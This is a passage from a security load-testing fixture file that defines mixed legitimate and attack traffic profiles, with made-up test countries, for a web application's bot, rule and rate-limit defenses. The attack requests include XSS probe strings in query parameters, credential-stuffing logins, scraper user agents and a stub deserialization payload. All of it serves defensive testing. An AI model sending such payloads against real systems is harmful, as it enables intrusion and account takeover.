      method: "GET",
      path: "/api/status",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "CF-IPCountry": "SG",
        "CF-Connecting-IP": "203.0.113.110",
      },
    },
    
    // === FORM SUBMISSIONS (legitimate logins) ===
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "203.0.113.12",
      },
      body: { username: "john.doe@example.com", password: "SecureP@ss123" },
    },
    
    // === PROTECTED ENDPOINT WITH TURNSTILE ===
    {
      method: "GET",
      path: "/api/protected",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "203.0.113.13",
      },
      turnstileToken: true,
    },
  ],
  expected: {
    blockRate: 0.05, // Lenient: 0-10% false positive rate
    successRate: 0.90, // Expect 90%+ success
    avgLatency: 100, // Lenient: up to 100ms
  },
};

/**
 * CORE_MIXED_TRAFFIC
 * 
 * Tests the full security stack with realistic mixed traffic:
 * - 60% legitimate requests
 * - 40% attack patterns (XSS, credential stuffing, bots, etc.)
 * 
 * Lenient metrics: 30-50% block rate, < 150ms latency
 */
export const CORE_MIXED_TRAFFIC: AttackProfile = {
  name: "Core Mixed Traffic",
  description: "Full security stack test with 60% legitimate + 40% attack traffic using real and fake countries",
  type: "sustained",
  requestsPerSecond: 50,
  duration: 45,
  concurrency: 15,
  pattern: {
    distribution: "wave",
    variance: 0.25,
  },
  requests: [
    // ================================================================
    // === LEGITIMATE TRAFFIC (60%) - Real Countries ===
    // ================================================================
    
    // United States - Chrome
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "198.51.100.10",
      },
    },
    {
      method: "GET",
      path: "/api/status",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "198.51.100.11",
      },
    },
    // Canada - Safari
    {
      method: "GET",
      path: "/",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "CF-IPCountry": "CA",
        "CF-Connecting-IP": "198.51.100.20",
      },
    },
    // United Kingdom - Chrome
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "CF-IPCountry": "GB",
        "CF-Connecting-IP": "198.51.100.30",
      },
    },
    // Germany - Firefox
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "CF-IPCountry": "DE",
        "CF-Connecting-IP": "198.51.100.40",
      },
    },
    // France - Safari
    {
      method: "GET",
      path: "/api/rules",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "CF-IPCountry": "FR",
        "CF-Connecting-IP": "198.51.100.50",
      },
    },
    // Japan - Mobile Safari
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "CF-IPCountry": "JP",
        "CF-Connecting-IP": "198.51.100.60",
      },
    },
    // South Korea - Android Chrome
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0",
        "CF-IPCountry": "KR",
        "CF-Connecting-IP": "198.51.100.70",
      },
    },
    // Australia - Edge
    {
      method: "GET",
      path: "/api/status",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
        "CF-IPCountry": "AU",
        "CF-Connecting-IP": "198.51.100.80",
      },
    },
    // Legitimate US login
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "CF-IPCountry": "US",
        "CF-Connecting-IP": "198.51.100.12",
      },
      body: { username: "user@example.com", password: "ValidPassword123!" },
    },
    
    // ================================================================
    // === ATTACK TRAFFIC (40%) - Using FAKE test countries ===
    // FAKE COUNTRIES (NOT REAL - for testing only):
    // ZZ = Fakeland (blocked), XX = Testonia (blocked), YY = Malwaristan (blocked)
    // QQ = Suspectia (challenged), WW = Botlandia (challenged)
    // ================================================================
    
    // XSS attacks from Fakeland (ZZ) - FAKE COUNTRY
    {
      method: "GET",
      path: "/api/public?q=<script>alert('xss')</script>",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland (blocked)
        "CF-Connecting-IP": "192.0.2.100",
      },
    },
    {
      method: "GET",
      path: "/api/public?input=<img src=x onerror=alert(1)>",
      headers: { 
        "User-Agent": "curl/7.68.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland (blocked)
        "CF-Connecting-IP": "192.0.2.101",
      },
    },
    
    // Credential stuffing from Testonia (XX) - FAKE COUNTRY
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "XX", // FAKE: Testonia (blocked)
        "CF-Connecting-IP": "192.0.2.110",
      },
      body: { username: "victim@test.com", password: "password123" },
    },
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "XX", // FAKE: Testonia (blocked)
        "CF-Connecting-IP": "192.0.2.111",
      },
      body: { username: "admin@test.com", password: "admin123" },
    },
    
    // Bot traffic from Malwaristan (YY) - FAKE COUNTRY
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Scrapy/2.6.0",
        "CF-IPCountry": "YY", // FAKE: Malwaristan (blocked)
        "CF-Connecting-IP": "192.0.2.120",
      },
    },
    
    // Suspicious traffic from Suspectia (QQ) - FAKE COUNTRY (challenged)
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "Mozilla/5.0",
        "CF-IPCountry": "QQ", // FAKE: Suspectia (challenged)
        "CF-Connecting-IP": "192.0.2.130",
      },
    },
    
    // Bot traffic from Botlandia (WW) - FAKE COUNTRY (challenged)
    {
      method: "GET",
      path: "/api/public",
      headers: { 
        "User-Agent": "wget/1.20.3",
        "CF-IPCountry": "WW", // FAKE: Botlandia (challenged)
        "CF-Connecting-IP": "192.0.2.140",
      },
    },
    
    // Deserialization attack from Fakeland (ZZ) - FAKE COUNTRY
    {
      method: "POST",
      path: "/api/login",
      headers: { 
        "User-Agent": "python-requests/2.28.0",
        "CF-IPCountry": "ZZ", // FAKE: Fakeland (blocked)
        "CF-Connecting-IP": "192.0.2.150",
      },
      body: { payload: "rO0ABXNyABFqYXZhLnV0aWwu" },
    },
  ],
  expected: {
    blockRate: 0.35, // Lenient: 30-50% block rate (attack traffic from fake countries)
    successRate: 0.60, // Expect ~60% success (legitimate traffic from real countries)
    avgLatency: 150, // Lenient: up to 150ms
  },
};

/**
 * All security test profiles
 */
export const SECURITY_TEST_PROFILES = {
  BOT_FOLDER_TEST,
  RATE_LIMITER_TEST,
  RULES_FOLDER_TEST,
  TRACING_FOLDER_TEST,
  CORE_LEGITIMATE_TRAFFIC,
  CORE_MIXED_TRAFFIC,
};

